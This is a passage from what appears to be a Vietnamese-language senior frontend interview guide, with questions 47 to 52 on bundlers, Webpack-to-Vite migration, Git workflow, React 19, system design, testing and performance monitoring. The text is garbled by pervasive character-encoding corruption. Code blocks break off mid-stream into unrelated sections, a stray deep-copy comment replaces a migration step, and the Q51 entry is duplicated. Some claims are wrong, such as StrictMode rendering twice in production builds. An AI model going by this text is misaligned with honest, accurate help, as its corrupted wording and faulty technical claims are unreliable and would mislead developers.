‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Webpack      ‚îÇ 10s       ‚îÇ Baseline     ‚îÇ
‚îÇ Rollup       ‚îÇ 8s        ‚îÇ 1.25x faster ‚îÇ
‚îÇ Vite         ‚îÇ 500ms     ‚îÇ 20x faster ‚ö°‚îÇ
‚îÇ esbuild      ‚îÇ 300ms     ‚îÇ 33x faster ‚ö°‚îÇ
‚îÇ Turbopack    ‚îÇ 1s        ‚îÇ 10x faster ‚ö°‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

PRODUCTION BUILD:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Tool         ‚îÇ Time      ‚îÇ Bundle Size  ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Webpack      ‚îÇ 30s       ‚îÇ 500KB        ‚îÇ
‚îÇ Rollup       ‚îÇ 15s       ‚îÇ 450KB ‚úÖ      ‚îÇ
‚îÇ Vite         ‚îÇ 10s       ‚îÇ 460KB        ‚îÇ
‚îÇ esbuild      ‚îÇ 2s ‚ö°      ‚îÇ 470KB        ‚îÇ
‚îÇ Turbopack    ‚îÇ 5s        ‚îÇ 460KB        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

HMR (Hot Module Replacement):
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Tool         ‚îÇ Update    ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Webpack      ‚îÇ 1-2s      ‚îÇ
‚îÇ Vite         ‚îÇ 50ms ‚ö°    ‚îÇ
‚îÇ Turbopack    ‚îÇ 50ms ‚ö°    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

#### **5Ô∏è‚É£ Migration Guide**

**üîÑ Webpack ‚Üí Vite:**

```typescript
 // Ch√∫ gi·∫£i: 1. Install Vite
npm install vite @vitejs/plugin-react

 // Ch√∫ gi·∫£i: 2. Create vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  
 // Ch√∫ gi·∫£i: Migrate Webpack aliases
  resolve: {
    alias: {
      '@': '/src',
    },
  },
  
 // Ch√∫ gi·∫£i: Migrate Webpack env vars
  define: {
    'process.env': {},
  },
});

 // Ch√∫ gi·∫£i: 3. Update index.html
 // Ch√∫ gi·∫£i: Move from public/ to root
 // Ch√∫ gi·∫£i: Change <script src="/src/index.tsx" type="module">

 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
{
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview"
  }
}

 // Ch√∫ gi·∫£i: 5. Replace Webpack-specific code
 // Ch√∫ gi·∫£i: - require() ‚Üí import
 // Ch√∫ gi·∫£i: - require.context() ‚Üí import.meta.glob()
 // Ch√∫ gi·∫£i: - process.env ‚Üí import.meta.env
```

**üîÑ Babel ‚Üí SWC:**

```bash
---
## 47. üåø Q47: Git Workflow & Team Collaboration - Branching Strategy, Merge vs Rebase, Conflict Resolution  

**P1: T√™n c√¢u h·ªèi:** üåø Q47: Git Workflow & Team Collaboration - Branching Strategy, Merge vs Rebase, Conflict Resolution  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (4-5 ph√∫t):**

**"Git workflow t·ªët = √≠t conflicts + d·ªÖ review + d·ªÖ rollback. Git Flow cho d·ª± √°n l·ªõn, GitHub Flow cho CI/CD. Rebase t·∫°o clean history, Merge gi·ªØ context. Feature flags deploy code ch∆∞a xong m√† kh√¥ng ·∫£nh h∆∞·ªüng production."**

**üîë 2 Branching Strategies:**

**1. Git Flow (D·ª± √°n l·ªõn, release theo version):**
- **Branches**: `main` (production) + `develop` (staging) + `feature/*` + `release/*` + `hotfix/*`
- **Flow**: feature ‚Üí develop ‚Üí release ‚Üí main
- **Hotfix**: main ‚Üí hotfix ‚Üí main + develop (fix bug khNeedsto·∫©n c·∫•p)
- Use case: Enterprise apps, mobile apps (v1.0, v2.0 releases)

**2. GitHub Flow (CI/CD, deploy li√™n t·ª•c):**
- **Branches**: `main` (lu√¥n deployable) + `feature/*`
- **Flow**: feature ‚Üí PR ‚Üí review ‚Üí merge main ‚Üí auto deploy
- **Simple**: Ch·ªâ 2 lo·∫°i branches, deploy m·ªói merge
- Use case: SaaS apps, web apps v·ªõi frequent deployments

**üîë Merge vs Rebase:**

| **Aspect** | **Merge** | **Rebase** |
|-----------|----------|----------|
| **History** | Gi·ªØ nguy√™n (merge commits) | S·∫°ch (linear) |
| **Context** | Gi·ªØ timeline th·ª±c | M·∫•t timeline |
| **Conflicts** | 1 l·∫ßn resolve | Nhi·ªÅu l·∫ßn (m·ªói commit) |
| **Use case** | Public branches (main, develop) | Private feature branches |

**Golden Rule**: **NEVER rebase public branches** (main, develop) - ch·ªâ rebase local/feature branches

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Rebase shared branch ‚Üí force push ‚Üí team m·∫•t commits
- Kh√¥ng pull tr∆∞·ªõc merge ‚Üí conflicts
- Commit tr·ª±c ti·∫øp v√†o main/develop ‚Üí bypass reviews
- Large PRs (>500 lines) ‚Üí kh√≥ review, d√πng feature flags thay v√¨

**üí° Ki·∫øn Th·ª©c Senior:**
- **Feature Flags**: Deploy code ch∆∞a xong nh∆∞ng t·∫Øt feature, b·∫≠t d·∫ßn (LaunchDarkly, Unleash)
- **Trunk-Based Development**: M·ªçi ng∆∞·ªùi commit v√†o main, feature flags control releases
- **Conventional Commits**: `feat:`, `fix:`, `docs:` - auto-generate changelogs
- **Git bisect**: Binary search t√¨m commit g√¢y bug (t·ª± ƒë·ªông test m·ªói commit)
- **Squash merge**: Combine feature commits th√†nh 1 commit khi merge (clean main history)


**‚ö° Quick Summary:**
> Git workflow t·ªët = √≠t conflict + d·ªÖ review + d·ªÖ rollback. Git Flow ph√π h·ª£p d·ª± √°n l·ªõn, GitHub Flow ph√π h·ª£p CI/CD. Rebase t·∫°o history s·∫°ch, Merge gi·ªØ nguy√™n context. Feature flags gi√∫p deploy code ch∆∞a ho√†n thi·ªán m√† kh√¥ng ·∫£nh h∆∞·ªüng production.

**üí° Ghi Nh·ªõ:**
- üå≥ **Git Flow**: main + develop + feature/* + release/* + hotfix/* (d·ª± √°n l·ªõn, release theo version)
- üöÄ **GitHub Flow**: main + feature/* (CI/CD, deploy li√™n t·ª•c)
- ‚öîÔ∏è **Merge vs Rebase**: Merge = gi·ªØ nguy√™n history, Rebase = history s·∫°ch nh∆∞ng m·∫•t context
- üö© **Feature Flags**: Deploy code m·ªõi nh∆∞ng t·∫Øt feature, b·∫≠t d·∫ßn theo ph·∫ßn trƒÉm user

---

### **1. Branching Models - C√°c M√¥ H√¨nh Ph√¢n Nh√°nh**

#### **1.1. Git Flow - M√¥ h√¨nh ph·ªï bi·∫øn cho d·ª± √°n l·ªõn**

```
üìä Structure Git Flow:

main (production)          ‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ (v1.0, v2.0, v3.0)
                              ‚ï±         ‚ï≤       
develop (staging)      ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ (code m·ªõi nh·∫•t)
                            ‚ï±     ‚ï≤   ‚ï±
feature/login      ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚óè                    (t√≠nh nƒÉng m·ªõi)
feature/payment    ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚óè                  (t√≠nh nƒÉng kh√°c)
                                    ‚ï≤
release/v2.0       ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ          (chu·∫©n b·ªã release)
                                            ‚ï≤
hotfix/bug-123     ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚óè‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  (fix l·ªói kh·∫©n c·∫•p)
```

**Chi ti·∫øt c√°c nh√°nh:**

```bash
---
## 48. ‚öõÔ∏è Q48: React 19 Migration Guide - Upgrade t·ª´ React 18 sang 19  

**P1: T√™n c√¢u h·ªèi:** ‚öõÔ∏è Q48: React 19 Migration Guide - Upgrade t·ª´ React 18 sang 19  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (4-5 ph√∫t):**

**"React 19 th√™m Actions (async transitions), new hooks (useActionState, useOptimistic, use), ref as prop. Breaking: PropTypes removed, createElement ‚Üí jsx(), StrictMode 2 renders. Migration: npx codemod + manual fixes."**

**üîë New Features:**

**1. Actions - Async State Transitions:**
- **T·ª± ƒë·ªông handle** pending/error states trong async operations
- `useTransition` + async functions = Actions
- `useActionState(action, initialState)` - all-in-one hook (replace useState + useTransition)
- Form Actions: `<form action={serverAction}>` - auto pending/error

**2. New Hooks:**
- **`useActionState`**: Combine useState + useTransition + error handling
- **`useOptimistic`**: Optimistic UI updates (show immediately, rollback if fail)
- **`use(promise)`**: Read promises/context in render (Suspense integration)

**3. Ref Simplification:**
- **`ref` as regular prop** - kh√¥ng c·∫ßn `forwardRef` wrapper
- `<Component ref={myRef} />` works directly
- Cleaner component APIs

**4. Improved Suspense:**
- Sibling Suspense boundaries kh√¥ng block nhau
- Better error boundaries integration

**üîë Breaking Changes:**

**1. PropTypes Removed:**
- D√πng **TypeScript** ho·∫∑c **Zod** thay v√¨
- Codemod: `npx codemod react/19/remove-prop-types`

**2. StrictMode Double Render:**
- Lu√¥n render 2 l·∫ßn trong dev (even production builds)
- ƒê·ªÉ detect side effects, kh√¥ng ·∫£nh h∆∞·ªüng performance production

**3. createElement ‚Üí jsx():**
- Internal change, build tools auto-handle
- Update Babel/SWC config n·∫øu custom setup

**4. Context Changes:**
- `<Context.Provider>` deprecated ‚Üí d√πng `<Context>` directly
- `Context.Consumer` deprecated ‚Üí d√πng `useContext` hook

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- D√πng PropTypes ‚Üí runtime error, migrate sang TypeScript
- Rely on single render trong StrictMode ‚Üí side effects leak
- Forget `use()` ch·ªâ call trong render (kh√¥ng trong conditions/loops)
- `useOptimistic` kh√¥ng rollback on error ‚Üí ph·∫£i manual handle

**üí° Ki·∫øn Th·ª©c Senior:**
- **Migration strategy**: Codemod ‚Üí fix errors ‚Üí incremental adoption (kh√¥ng c·∫ßn rewrite all)
- **Server Components**: React 19 stable support (Next.js App Router)
- **Compiler (React Forget)**: Auto-memoization (experimental, beta 2024)
- **Actions vs Mutations**: Actions = client transitions, Server Actions = server mutations


**‚ö° Quick Summary:**
> React 19 = Actions + useActionState + useOptimistic + ref as prop + no forwardRef. Breaking changes: React.createElement ‚Üí jsx(), StrictMode 2 renders, PropTypes removed. Migration: npx codemod + manual fixes.

**üí° Ghi Nh·ªõ:**
- üéØ **Actions**: Async transitions t·ª± ƒë·ªông handle pending/error/optimistic updates
- üîß **New Hooks**: useActionState, useOptimistic, use (read promises/context)
- üöÄ **Ref Simplification**: ref as prop, no forwardRef needed
- ‚ö†Ô∏è **Breaking**: PropTypes removed, StrictMode double render, createElement ‚Üí jsx()

---
---
## 49. üèóÔ∏è Q49: System Design - Thi·∫øt K·∫ø H·ªá Th·ªëng Frontend Architecture  

**P1: T√™n c√¢u h·ªèi:** üèóÔ∏è Q49: System Design - Thi·∫øt K·∫ø H·ªá Th·ªëng Frontend Architecture  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (5-7 ph√∫t):**

**"Frontend system design bao g·ªìm: Architecture (Microfrontends/Monorepo), API layer (BFF, GraphQL), State management (global/local), Performance (CDN, lazy load), Resilience (error boundaries, fallbacks). C·∫ßn balance scalability vs complexity."**

**üîë 5 Pillars c·ªßa Frontend System Design:**

**1. Architecture Patterns:**
- **Microfrontends**: Independent deployable apps share same domain (Module Federation)
  - ∆Øu: Teams t·ª± ch·ªß, tech diversity, independent deploy
  - Nh∆∞·ª£c: Complexity, bundle duplication, runtime overhead
- **Monorepo**: Single repo, multiple packages (Nx, Turborepo)
  - ∆Øu: Code sharing, atomic commits, unified tooling
  - Nh∆∞·ª£c: Build time, CI/CD complexity

**2. API Layer Design:**
- **BFF (Backend for Frontend)**: API gateway tailored cho frontend needs
  - Aggregate multiple services, transform data format
- **GraphQL**: Client-driven queries, avoid over/under-fetching
- **REST**: Simple, cacheable, well-understood

**3. State Management:**
- **Global**: Redux/Zustand (auth, theme, user data)
- **Server Cache**: React Query/SWR (API data, auto-refetch)
- **Local**: useState/useReducer (form, UI state)
- **URL**: React Router (filters, pagination)

**4. Performance Optimization:**
- **CDN**: Static assets + edge caching (CloudFlare, Vercel Edge)
- **Code Splitting**: Route-based, component-based lazy loading
- **Resource Hints**: preload, prefetch, preconnect
- **Image Optimization**: WebP, AVIF, responsive images

**5. Resilience & Monitoring:**
- **Error Boundaries**: Catch React errors, show fallback UI
- **Circuit Breaker**: Stop calling failing services
- **Feature Flags**: Gradual rollouts, A/B testing
- **Monitoring**: Sentry (errors), DataDog (performance), analytics

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Over-engineering: Start monolith, migrate microfrontends when needed
- Kh√¥ng cache API responses ‚Üí redundant requests
- Single global store (Redux) cho m·ªçi state ‚Üí complexity, d√πng React Query cho server state
- Kh√¥ng error boundaries ‚Üí 1 component crash = to√†n app crash

**üí° Ki·∫øn Th·ª©c Senior:**
- **CAP Theorem** (frontend context): Trade-off gi·ªØa Consistency (data freshness) vs Availability (offline support)
- **Islands Architecture**: Static HTML + interactive components (Astro) - best performance
- **Streaming SSR**: Progressive rendering (React 18 Suspense + Next.js)
- **Observability**: Tracing (OpenTelemetry), RUM (Real User Monitoring), synthetic monitoring

> **C√¢u h·ªèi ph·ªèng v·∫•n Senior/Lead Frontend Developer**  
> **ƒê·ªô kh√≥:** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê (Expert Level)  
> **Th·ªùi gian tr·∫£ l·ªùi:** 20-30 ph√∫t (v·ªõi whiteboard)

---
---
## 50. üß™ Q50: Testing Strategy - Unit, Integration, E2E Testing  

**P1: T√™n c√¢u h·ªèi:** üß™ Q50: Testing Strategy - Unit, Integration, E2E Testing  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (4-5 ph√∫t):**

**"Test Pyramid: 60% Unit (fast, isolated), 30% Integration (component interactions), 10% E2E (critical user flows). Tools: Vitest/Jest (unit), React Testing Library (integration), Playwright (E2E). TDD cho logic, BDD cho features."**

**üîë Test Pyramid Strategy:**

```
        ‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïÆ
       ‚ï± E2E  ‚ï≤     10% - Ch·∫≠m, expensive, critical paths only
      ‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïÆ
     ‚ï± Integr. ‚ï≤   30% - Component + API integration
    ‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïÆ
   ‚ï±   Unit    ‚ï≤  60% - Fast, pure functions, business logic
  ‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïØ
```

**üîë 3 Lo·∫°i Tests:**

**1. Unit Tests (Jest/Vitest):**
- **Test**: Pure functions, utilities, hooks (isolated)
- **Fast**: ~1ms/test, ch·∫°y thousands trong gi√¢y
- **Mock**: External dependencies (APIs, modules)
- **Coverage**: 80-90% cho business logic
- V√≠ d·ª•: `formatCurrency(1000)` ‚Üí "$1,000.00"

**2. Integration Tests (React Testing Library):**
- **Test**: Component interactions, user events, API integration
- **Medium speed**: ~50-200ms/test
- **Real DOM**: jsdom simulation, user-centric queries (`getByRole`)
- **Coverage**: 70-80% cho UI components
- V√≠ d·ª•: Click button ‚Üí API call ‚Üí show data

**3. E2E Tests (Playwright/Cypress):**
- **Test**: Critical user flows (login, checkout, payment)
- **Slow**: ~5-30s/test, ch·∫°y real browser
- **Flaky**: Network issues, timing problems
- **Coverage**: Ch·ªâ happy paths + critical errors
- V√≠ d·ª•: Full checkout flow (add to cart ‚Üí payment ‚Üí confirmation)

**üîë Best Practices:**

- **TDD (Test-Driven Development)**: Write test ‚Üí fail ‚Üí implement ‚Üí pass ‚Üí refactor
- **AAA Pattern**: Arrange (setup) ‚Üí Act (execute) ‚Üí Assert (verify)
- **Test behavior, not implementation**: Test user outcomes, not internal state
- **CI/CD Integration**: Run unit/integration on PR, E2E on merge to main

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Test implementation details (`.classList`, internal state) ‚Üí brittle, d√πng user-visible behavior
- 100% coverage cho m·ªçi th·ª© ‚Üí waste time, focus critical logic
- E2E tests cho m·ªçi feature ‚Üí ch·∫≠m CI, d√πng integration tests thay v√¨
- Kh√¥ng test error cases ‚Üí production bugs

**üí° Ki·∫øn Th·ª©c Senior:**
- **Visual Regression**: Chromatic, Percy - screenshot diff testing
- **Performance Testing**: Lighthouse CI, WebPageTest - track metrics over time
- **Contract Testing**: Pact - ensure frontend/backend API compatibility
- **Mutation Testing**: Stryker - test your tests (kill mutants)
- **Parallel execution**: Playwright sharding, Jest workers - faster CI

> **C√¢u h·ªèi ph·ªèng v·∫•n Senior Frontend Developer**  
> **ƒê·ªô kh√≥:** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê (Expert Level)  
> **Th·ªùi gian tr·∫£ l·ªùi:** 15-20 ph√∫t

---
---
## 51. üìä Q51: Performance Monitoring & APM - Gi√°m S√°t Hi·ªáu Su·∫•t ·ª®ng D·ª•ng (B·∫£n Ti·∫øng Vi·ªát)  

**P1: T√™n c√¢u h·ªèi:** üìä Q51: Performance Monitoring & APM - Gi√°m S√°t Hi·ªáu Su·∫•t ·ª®ng D·ª•ng (B·∫£n Ti·∫øng Vi·ªát)  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (4-5 ph√∫t):**

**"APM tracking: Core Web Vitals (LCP, INP, CLS), Sentry (error tracking), DataDog RUM (user monitoring). Performance budgets, source maps trong production, Chrome DevTools profiling, custom metrics."**

**üîë 7 Th√†nh Ph·∫ßn APM:**

**1. Core Web Vitals - Google Metrics:**
- **LCP** (Largest Contentful Paint): < 2.5s (time to main content)
- **INP** (Interaction to Next Paint): < 200ms (user interaction lag) - thay FID
- **CLS** (Cumulative Layout Shift): < 0.1 (visual stability)
- **Tool**: Lighthouse, PageSpeed Insights, Web Vitals library
- **Impact**: SEO ranking, user experience

**2. Sentry - Error Tracking:**
- **Setup**: `Sentry.init()` v·ªõi DSN, environment, release
- **Features**: Error grouping, breadcrumbs, user context, performance tracing
- **Source maps**: Upload ƒë·ªÉ debug minified code trong production
- **Alerts**: Email/Slack khi error spike
- **Best practice**: Sampling rate (avoid quota), filter sensitive data

**3. DataDog RUM (Real User Monitoring):**
- **Metrics**: Page load, JS errors, resources, user actions, long tasks
- **Session replay**: Record user sessions (find bugs)
- **APM Integration**: Connect frontend errors v·ªõi backend traces
- **Custom events**: Track business metrics (purchases, clicks)

**4. Performance Budgets:**
- **Define**: Max bundle size (JS < 200KB), max LCP < 2.5s
- **Enforce**: Webpack BundleBudgetPlugin, Lighthouse CI fail build
- **Monitor**: Track trends, alert khi v∆∞·ª£t budget

**5. Source Maps Production:**
- **Purpose**: Debug minified code trong production errors
- **Security**: Upload private (Sentry/DataDog), kh√¥ng serve public
- **Generate**: `webpack devtool: 'hidden-source-map'`

**6. Chrome DevTools Profiling:**
- **Performance tab**: Record timeline, find bottlenecks (long tasks)
- **Coverage tab**: Unused JS/CSS (tree-shake candidates)
- **Memory tab**: Heap snapshots, memory leaks (detached nodes)
- **Network tab**: Waterfall, slow resources

**7. Custom Performance Metrics:**
```javascript
 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
performance.mark('checkout-start');
 // Ch√∫ gi·∫£i: ... logic
performance.mark('checkout-end');
performance.measure('checkout', 'checkout-start', 'checkout-end');
const measure = performance.getEntriesByName('checkout')[0];
 // Ch√∫ gi·∫£i: Send to APM: Sentry, DataDog
```

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Kh√¥ng set performance budgets ‚Üí bundle bloat
- Source maps public ‚Üí security risk (expose code)
- Kh√¥ng filter PII trong error logs ‚Üí GDPR violation
- Qu√° nhi·ªÅu custom events ‚Üí quota limit, performance overhead

**üí° Ki·∫øn Th·ª©c Senior:**
- **PerformanceObserver**: Monitor FCP, LCP, INP realtime (kh√¥ng d√πng polling)
- **Session replay privacy**: Mask sensitive inputs, credit cards
- **Distributed tracing**: Trace request t·ª´ frontend ‚Üí backend ‚Üí DB
- **Synthetic monitoring**: Automated tests (Pingdom, Checkly) ƒë·ªÉ catch issues
- **Alerting thresholds**: P95, P99 thay v√¨ average (avoid outliers skew data)

> **C√¢u h·ªèi ph·ªèng v·∫•n Senior Frontend Developer**  
> **ƒê·ªô kh√≥:** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê (Expert Level)  
> **Th·ªùi gian tr·∫£ l·ªùi:** 15-20 ph√∫t

---
---
## 52. üìä Q51: Performance Monitoring & APM - Application Performance Monitoring  

**P1: T√™n c√¢u h·ªèi:** üìä Q51: Performance Monitoring & APM - Application Performance Monitoring  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (4-5 ph√∫t):**

**"Performance monitoring tracks Core Web Vitals (LCP, INP, CLS) + custom metrics. Tools: Sentry (errors), DataDog/New Relic (RUM), Lighthouse CI (lab tests). Set budgets (JS < 200KB), alerts (LCP > 2.5s), optimize iteratively."**

**üîë Core Web Vitals (Google Ranking Factors):**

**1. LCP (Largest Contentful Paint) - T·ªëc ƒë·ªô t·∫£i:**
- **M√©tric**: Th·ªùi gian ph·∫ßn t·ª≠ l·ªõn nh·∫•t hi·ªÉn th·ªã
- **Target**: ‚â§ 2.5s (good), 2.5-4s (needs improvement), > 4s (poor)
- **Optimize**: Preload images, CDN, optimize images (WebP), server response time

**2. INP (Interaction to Next Paint) - Responsiveness:**
- **M√©tric**: Th·ªùi gian t·ª´ click/tap ƒë·∫øn update UI
- **Target**: ‚â§ 200ms (good), 200-500ms (needs improvement), > 500ms (poor)
- **Optimize**: Debounce events, code splitting, avoid long tasks (>50ms)

**3. CLS (Cumulative Layout Shift) - Visual stability:**
- **M√©tric**: Layout shifts b·∫•t ng·ªù (images, ads load)
- **Target**: ‚â§ 0.1 (good), 0.1-0.25 (needs improvement), > 0.25 (poor)
- **Optimize**: Set width/height cho images, reserve space cho ads

**üîë APM Tools:**

**1. Sentry - Error Tracking:**
- **Captures**: JS errors, unhandled rejections, network errors
- **Context**: User info, breadcrumbs (user actions), device/browser
- **Source maps**: Show original code in production errors
- **Alerts**: Slack/email khi error spike

**2. DataDog/New Relic - RUM (Real User Monitoring):**
- **Tracks**: Core Web Vitals, custom metrics, user sessions
- **Distributed tracing**: Frontend request ‚Üí API ‚Üí Database (full stack)
- **Dashboards**: Real-time metrics, historical trends
- **Synthetic monitoring**: Simulated user journeys (check uptime)

**3. Lighthouse CI:**
- **Lab tests**: Automated performance audits on PR
- **Budgets**: Fail build n·∫øu JS > 200KB, LCP > 3s
- **Trends**: Track performance regression over time

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Ship source maps public ‚Üí expose code, d√πng `hidden-source-map`
- Kh√¥ng sample events ‚Üí high APM costs, sample 10-20% traffic
- Ignore CLS ‚Üí SEO penalty, poor UX
- Kh√¥ng set performance budgets ‚Üí gradual degradation

**üí° Ki·∫øn Th·ª©c Senior:**
- **TTFB (Time to First Byte)**: Server response time, optimize v·ªõi CDN/edge
- **FID ‚Üí INP**: Google replaced FID (First Input Delay) v·ªõi INP (2024)
- **Custom metrics**: `performance.mark()`, `performance.measure()` cho business logic
- **Session replay**: FullStory, LogRocket - replay user sessions cho debugging
- **Alerting**: Set thresholds (LCP p75 > 3s) ‚Üí PagerDuty/Slack alerts

> **C√¢u h·ªèi ph·ªèng v·∫•n Senior Frontend Developer**  
> **ƒê·ªô kh√≥:** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê (Expert Level)  
> **Th·ªùi gian tr·∫£ l·ªùi:** 15-20 ph√∫t

---
---
